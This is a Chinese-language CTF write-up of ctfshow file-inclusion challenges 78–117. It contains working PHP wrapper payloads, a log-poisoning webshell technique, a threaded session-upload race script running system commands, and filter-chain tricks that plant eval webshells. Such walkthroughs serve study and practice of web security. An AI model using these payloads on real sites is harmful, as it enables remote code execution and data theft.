---
uuid: aa00a9a2-4b3f-2cd6-456d-cb1021577e91
title: ctfshow文件包含78-117
date: 2022-02-26 14:34:46
tags: 
    - ctfshow
    - web
    - wp
    - CTF
    - 文件包含
categories: 
    - [Web]       
    - [CTF]
---
**ctfshow文件包含刷题记录**

![image-20220713120008631](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131200686.png?x-oss-process=hzy)

<!--more-->

# 前言

## PHP包含函数

- include()：如果包含文件未找到会显示警告，脚本继续执行；
- include_once()：包含过的文件不再包含，包含文件未找到会显示警告，脚本继续执行；
- require()：包含文件未找到会产生致命错误，脚本终止；
- require_once()：包含过的文件不再包含，包含文件未找到会产生致命错误，脚本终止。

## 敏感文件

```
Linux/Unix系统
/etc/passwd                                                              //  账户信息
/etc/shadow                                                             //  账户密码文件
/usr/local/app/apache2/conf/httpd.conf                                 //   Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf                    //   虚拟网站配置
/usr/local/app/php5/lib/php.ini                                      //   PHP相关配置
/etc/httpd/conf/httpd.conf                                          //   Apache配置文件
/etc/my.conf                                                       //   mysql 配置文件
```

## php伪协议

- 条件：
  - `allow_url_fopen`:off/on
  - `allow_url_include` :仅`php://input php://stdin php://memory php://temp`需要on

`php://` 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`，`php://filter`用于**读取源码**，`php://input`用于**执行php代码**。

| 参数     | 功能     |
| -------- | -------- |
| read     | 读取     |
| write    | 写入     |
| resource | 数据来源 |

```
读取文件源码可以直接用resource读取(常用)
php://filter/convert.base64-encode/resource=flag.php	       base64编码
php://filter/convert.quoted-printable-encode/resource=flag.php quoted-printable编码
php://filter/string.rot13/resource=flag.php                     rot13变换`
```

## data:// 协议

- 条件
  - `allow_url_fopen`:on
  
  - `allow_url_include` :on

 ```
 data://text/plain,<?php phpinfo();?>
 data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 ```

## 日志文件include

- 原理:对网站进行访问时,日志文件会记录相关信息(请求头中的信息)
- 前提:知道日志文件所在,并能进行包含
- 步骤:
  - 先访问网站在请求头中写入一句话(一般写在UA中)
  - 然后通过post去尝试执行
  - 执行成功后通过蚁剑连接得到shell

内容参考博客:

https://blog.csdn.net/weixin_45794666/article/details/111713495


# web77

![image-20220226143629846.png](https://z4a.net/images/2022/06/14/image-20220226143629846.png)

考察php伪协议，直接`?file=php://filter/convert.base64-encode/resource=flag.php`，然后得到base64加密内容![image-20220226143837369.png](https://z4a.net/images/2022/06/14/image-20220226143837369.png)

然后base64解密得到flag![image-20220226143858354.png](https://z4a.net/images/2022/06/14/image-20220226143858354.png)

# web79

![image-20220226144104774.png](https://z4a.net/images/2022/06/14/image-20220226144104774.png)

审计一下发现还是考察php伪协议，所以直接data协议加正则匹配替换，因为在这个题中对小写php进行了过滤，所以我们可以用p?p.

> ?file=data://text/plain,<?=system("tac%20flag.p?p");?>

![image-20220226145551517.png](https://z4a.net/images/2022/06/14/image-20220226145551517.png)

# web80

![image-20220323192713160](https://img-blog.csdnimg.cn/img_convert/664efd6d6fd8fae96f759eeea0e6ce74.png)

过滤了php协议，过滤了data协议，查看一个这个路径

`?file=/var/log/nginx/access.log`，发现存在日志包含，bp抓包![image-20220323192839133](https://img-blog.csdnimg.cn/img_convert/b90593cc59089a5950034e9ccdabc47f.png)

直接在ua里面下马放包![image-20220323192954808](https://img-blog.csdnimg.cn/img_convert/ef09fc67f19ef5c6776fa8cf028eb2eb.png)

![](https://img-blog.csdnimg.cn/img_convert/24e67f9b55fdfe1bf8e72111e5ca7f67.png)

![image-20220323193022938](https://img-blog.csdnimg.cn/img_convert/ad60a3d1dc711a98475cf9f3261dc960.png)

# web81

![image-20220323193119066](https://img-blog.csdnimg.cn/img_convert/071d5ae214061afff4044e78df2cac21.png)

这道题同上，存在日志包含漏洞

![image-20220323193326689](https://img-blog.csdnimg.cn/img_convert/739d447ce88f1d661bec11607989e3d4.png)

# web82

![image-20220323195224767](https://img-blog.csdnimg.cn/img_convert/03f0210290e709bd3f65bb8490db287b.png)

# web83

![image-20220323195307713](https://img-blog.csdnimg.cn/img_convert/cf2c677e2736235f977f6f0343be80f1.png)

这道题过滤了php，data，分号还有`.`

显然这样不行了![image-20220323195759318](https://img-blog.csdnimg.cn/img_convert/83424b79755d4c16e70834050e20eaee.png)

这道题是利用PHP_SESSION_UPLOAD_PROGRESS进行session文件包含和条件竞争

> **竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**

不是夜猫子,等不到这个时候,83-86先暂时放着吧,放个通杀脚本

```
# -*- coding: utf-8 -*-
# @author:lonmar
import io
import requests
import threading

sessID = 'flag'
url = 'http://7920d625-4983-43eb-9d4f-335e57303fd0.chall.ctf.show/'


def write(session):
    while event.isSet():
        f = io.BytesIO(b'a' * 1024 * 50)
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat *.php");?>'},
            files={'file': ('test.txt', f)}
        )


def read(session):
    while event.isSet():
        response = session.get(url + '?file=/tmp/sess_{}'.format(sessID))
        if 'test' in response.text:
            print(response.text)
            event.clear()
        else:
            print('[*]retrying...')


if __name__ == '__main__':
    event = threading.Event()
    event.set()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
```



# web87

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);  //  php伪协议被ban
    $file = str_replace("data", "???", $file);  // data协议被ban
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
}
```

```
file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
//?file=php://filter/string.rot13/resource=2.php
```

```
post
content=aaPD9waHAgZXZhbCgkX1BPU1RbSF0pOz8+    //<?php eval($_POST[H]);?>
```

> content的值前面要加两个字符，因为base64算法解码时是4个byte一组，前面还剩phpdie 6个字符，所以给他增加2个字符 一共8个字符

然后命令执行

```
H=system('tac *');
```

# web88

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){  // 过滤了这些,但是没有过滤:
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

payload

```
?file=data://text/plain;base64, PD9waHAgc3lzdGVtKCdiYXNlNjQgZmwwZy5waHAnKTsgPz4
```

![image-20220713113222348](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131132452.png?x-oss-process=hzy)

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:24:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:25:00
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$flag="ctfshow{4dc213a5-7f9e-49bc-8d00-31104deb9091}";
```

# web116

进去之后就是一段视频,下载下来

![image-20220713113419642](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131134829.png?x-oss-process=hzy)

我省略了分离png的步骤,misc就不弄了,麻烦,总之就是把视频down下,然后用winhex分离出来一个图片

bp抓包文件包含,读源码![image-20220713113849280](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131138370.png?x-oss-process=hzy)

```
<?php
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|data|input|rot13|base64|string|log|sess/i',$x)){  // 过滤了这些
        die('too young too simple sometimes naive!');
    }
}
$file=isset($_GET['file'])?$_GET['file']:"5.mp4";
filter($file);
header('Content-Type: video/mp4');
header("Content-Length: $file");
readfile($file);
?>
```

![image-20220713114100730](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131141836.png?x-oss-process=hzy)

是可以正常读文件的,那我们直接包含flag吧

![image-20220713114600610](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131146685.png?x-oss-process=hzy)

# web117

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: yu22x
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 18:16:59

*/
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

```
payload: file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php 

post:contents=?<hp pvela$(P_SO[T]1;)>?
```

![image-20220713115532139](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131155218.png?x-oss-process=hzy)

--------------------------

# 参考:

[ctfshow-web入门-文件包含-87-88 | Rolemee的小破站](https://rolemee.com/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-87-88/#!)

[ctfshow web入门 78-88的文件包含 - CTFshow WP](https://wp.ctf.show/d/140-ctfshow-web-78-88)

[CTFshow---WEB入门---（文件包含）78-88 ，116,117 WP - Bit's Blog (xl-bit.cn)](https://www.xl-bit.cn/index.php/archives/84/)

[谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
